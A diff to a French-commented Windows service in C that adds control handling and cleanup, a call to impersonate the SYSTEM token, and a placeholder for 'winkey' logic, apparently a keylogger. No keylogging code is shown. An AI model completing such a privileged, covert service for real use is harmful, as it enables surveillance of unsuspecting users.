@@ -12,14 +12,21 @@ void ServiceCtrlHandler(DWORD event)
             break;
 
         case SERVICE_CONTROL_PAUSE:
-            // Handle pause control
+            g_service_status.dwCurrentState = SERVICE_PAUSED;
+            SetServiceStatus(g_handler_svc, &g_service_status);
             break;
+
         case SERVICE_CONTROL_CONTINUE:
-            // Handle continue control
+            g_service_status.dwCurrentState = SERVICE_CONTINUE_PENDING;
+            SetServiceStatus(g_handler_svc, &g_service_status);
             break;
+
         case SERVICE_CONTROL_SHUTDOWN:
-            // Handle shutdown control
+            g_service_status.dwCurrentState = SERVICE_STOPPED;
+            SetServiceStatus(g_handler_svc, &g_service_status);
+            SetEvent(g_event);
             break;
+
         default:
             break;
     }
@@ -55,14 +62,25 @@ void WINAPI ServiceMain(DWORD argc, LPSTR *argv)
         return;
     }
 
+    // Impersonate SYSTEM token
+    Impersonate_token();
+
     // Met à jour le statut du service à RUNNING
     g_service_status.dwCurrentState = SERVICE_RUNNING;
     g_service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
     SetServiceStatus(g_handler_svc, &g_service_status);
 
-    // Boucle / attente jusqu'au STOP
+    // logique winkey ici
+
+
+    // Boucle / attente jusqu'au STOP / SHUTDOWN
     WaitForSingleObject(g_event, INFINITE);
-    
+
+    // Nettoyage avant l'arrêt du service
+    CloseHandle(g_event);
+    g_service_status.dwCurrentState = SERVICE_STOPPED;
+    SetServiceStatus(g_handler_svc, &g_service_status);
+    return;
 }
 
 
